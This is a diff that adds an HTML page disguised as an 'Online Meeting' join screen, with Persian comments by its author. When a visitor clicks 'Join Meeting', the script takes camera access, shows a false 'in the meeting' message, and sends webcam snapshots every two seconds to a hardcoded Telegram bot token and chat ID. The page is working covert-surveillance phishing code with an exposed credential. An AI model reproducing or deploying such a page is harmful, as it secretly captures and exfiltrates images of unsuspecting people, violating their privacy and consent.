@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Meeting</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #202124; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
+        .container { text-align: center; }
+        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #0056b3; }
+        #status { margin-top: 20px; color: #4caf50; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Online Meeting</h1>
+        <p>Click the button below to join the meeting.</p>
+        <button id="joinBtn">Join Meeting</button>
+        <p id="status">Camera connected. You are in the meeting.</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = 9242317690:AAEgLcozxE3Mg70f8zK5x9xRibRTAknhLhk; // توکن بات خودت
+        const CHAT_ID = 7309901290 ;     // آیدی عددی خودت
+
+        let videoStream = null;
+        let intervalId = null;
+
+        async function sendPhotoToTelegram(imageData) {
+            try {
+                // ارسال عکس با متد آپلود فایل تلگرام
+                const blob = await (await fetch(imageData)).blob();
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'photo.jpg');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Error sending photo:', error);
+            }
+        }
+
+        async function captureFrame(video, canvas) {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        document.getElementById('joinBtn').addEventListener('click', async () => {
+            try {
+                // درخواست دسترسی به دوربین
+                videoStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480 }, 
+                    audio: false 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = videoStream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+
+                // مخفی کردن دکمه و نمایش وضعیت
+                document.getElementById('joinBtn').style.display = 'none';
+                document.getElementById('status').style.display = 'block';
+
+                // گرفتن عکس اولیه
+                const firstFrame = await captureFrame(video, canvas);
+                await sendPhotoToTelegram(firstFrame);
+
+                // تایمر هر ۲ ثانیه عکس بگیر و بفرست
+                intervalId = setInterval(async () => {
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                        const frame = await captureFrame(video, canvas);
+                        await sendPhotoToTelegram(frame);
+                    }
+                }, 2000);
+
+            } catch (err) {
+                console.error('Camera error:', err);
+                alert('Could not access camera. Please allow access.');
+            }
+        });
+
+        // قطع کردن دوربین وقتی صفحه بسته شد
+        window.addEventListener('beforeunload', () => {
+            if (intervalId) clearInterval(intervalId);
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
